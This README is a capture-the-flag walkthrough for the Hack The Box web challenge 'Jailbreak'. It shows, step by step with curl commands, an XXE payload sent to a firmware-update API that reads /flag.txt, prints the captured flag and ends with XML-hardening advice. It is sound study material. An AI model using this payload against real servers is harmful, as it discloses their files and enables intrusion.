# Jailbreak

## Overview

This directory contains the local materials and saved solve workflow for the `Jailbreak` challenge on Hack The Box. This README is written as a practical walkthrough so someone can open the folder, inspect the challenge files, understand the intended weakness, and reproduce the solve with commands that are easy to copy and run.

## Challenge Profile

- Challenge: `Jailbreak`
- Category: `Web`
- Platform: `Hack The Box`
- Saved PoC: `jailbreak_poc.sh`

## Directory Contents

- `jailbreak_poc.sh`

## First Commands To Run

Begin with a short inventory so you can see the original challenge archive, any extracted directories, and the solve script saved in this folder.

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Jailbreak"
ls -lah
```

Read the top of the PoC first. The comments there summarize the exact idea used during the solve and usually explain the bug, leak, algorithm, or reversing trick directly.

```bash
sed -n "1,220p" "jailbreak_poc.sh"
```

Run the PoC after reviewing the notes.

```bash
chmod +x "jailbreak_poc.sh"
./jailbreak_poc.sh
```

If the script targets a spawned remote service, you can usually point it at a fresh instance by supplying a host and port.

```bash
./jailbreak_poc.sh <HOST> <PORT>
```

## Walkthrough

Challenge Name: Jailbreak
Category: Web
Platform: Hack The Box

### Description

We are given a Pip-Boy themed firmware update interface. The scenario hints
that we need to bypass the device protections and it explicitly says the flag
is stored in:
/flag.txt

Spawned target used during solving:
http://154.57.164.74:30679

### Core lesson

XML parsers can become dangerous when they allow external entity expansion.
If the server parses attacker-controlled XML with DTDs enabled, we may be
able to make it read local files from the server.

This is the classic XXE pattern:
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>

and then reference:
&xxe;

Step 1: Identify the interesting route.
Manual command:
curl -s http://154.57.164.74:30679/rom

Reason:
The ROM page contains a "Firmware Update" form with a textarea that expects
XML input.

Step 2: Read the client-side JavaScript.
Manual command:
curl -s http://154.57.164.74:30679/static/js/update.js

Reason:
The JavaScript shows the exact backend endpoint:
POST /api/update
with Content-Type: application/xml

Step 3: Confirm normal behavior.
Manual command:
curl -s -X POST http://154.57.164.74:30679/api/update \
-H 'Content-Type: application/xml' \
--data '<FirmwareUpdateConfig><Firmware><Version>1.33.7</Version></Firmware></FirmwareUpdateConfig>'

Reason:
The response reflects the parsed firmware version:
"Firmware version 1.33.7 update initiated."

That reflection is important because it gives us a clean place to display the
contents of an external entity.

Step 4: Send an XXE payload.
Manual command:
curl -s -X POST http://154.57.164.74:30679/api/update \
-H 'Content-Type: application/xml' \
--data-binary @- <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<FirmwareUpdateConfig>
<Firmware>
<Version>&xxe;</Version>
</Firmware>
</FirmwareUpdateConfig>
EOF

Reason:
The XML parser resolves &xxe; by reading /flag.txt from the server filesystem.
The application then inserts that value into the JSON success message.

### Real-world concept

XXE can lead to:
- local file disclosure
- SSRF
- access to cloud metadata endpoints
- denial of service through entity expansion

Safe parsing generally means:
- disable external entity resolution
- disable DTD processing when not needed
- treat uploaded XML as untrusted input

### Flag obtained

HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_c89ad12a436c81cabb1d862cf6c06547}

## Reproduction Commands

Use the following command sequence if you want a short and reliable path from opening the folder to reproducing the saved solve.

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Jailbreak"
sed -n "1,220p" "jailbreak_poc.sh"
bash "jailbreak_poc.sh"
```

## Study Notes

This challenge is worth revisiting if you are practicing `Web` problems. The saved PoC is meant to be the fast path, but the better learning path is to inspect the provided files yourself first, confirm the weakness manually, and then compare your reasoning with the script comments and implementation.
